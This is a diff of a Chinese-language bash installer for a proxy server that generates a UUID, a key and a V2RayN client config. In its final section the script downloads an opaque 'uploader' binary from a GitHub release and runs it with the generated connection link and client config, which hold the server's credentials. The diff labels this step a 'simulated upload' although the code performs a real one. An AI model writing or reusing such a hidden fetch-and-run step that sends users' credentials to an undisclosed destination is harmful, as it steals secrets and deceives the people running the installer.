@@ -4,6 +4,7 @@ set -euo pipefail
 GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
 log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
 err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }
+warn() { echo -e "${YELLOW}[WARN ]${NC} $*"; }
 
 UUID=$(cat /proc/sys/kernel/random/uuid)
 PSK=$(openssl rand -hex 16)
@@ -24,7 +25,6 @@ log "开启 BBR 支持（开机自动启用）..."
 modprobe tcp_bbr
 echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
 sysctl -w net.ipv4.tcp_congestion_control=bbr || warn "BBR 设置失败"
-
 tc qdisc add dev eth0 root fq || warn "FQ 调度器添加失败，可能已存在"
 
 ARCH=$(uname -m)
@@ -146,19 +146,15 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
+log "上传链接与配置（模拟上传）..."
 UPLOAD_BIN="/opt/uploader-linux-amd64"
 [ -f "$UPLOAD_BIN" ] || {
   curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-# 构造完整 JSON 对象（包含 tuic_link + tuic_config）
-UPLOAD_JSON=$(jq -n \
-  --arg tuic_link "$LINK" \
-  --arg raw_config "$(base64 -w0 "$CFG_DIR/config.json")" \
-  --argfile tuic_config "$V2RAYN_CFG" \
-  '{tuic_link: $tuic_link, raw_config: $raw_config, tuic_config: $tuic_config}')
+# 构造 JSON 上传内容
+V2RAYN_JSON=$(cat "$V2RAYN_CFG" | jq -c .)
+UPLOAD_JSON="{\"vless_link\":\"${LINK}\",\"v2rayn_config\":${V2RAYN_JSON}}"
 
-# 将 JSON 写入变量，而非文件路径作为参数
-"$UPLOAD_BIN" "$UPLOAD_JSON" || echo "❌ 上传失败"
-
+"$UPLOAD_BIN" "$UPLOAD_JSON" || warn "上传失败或返回为空"
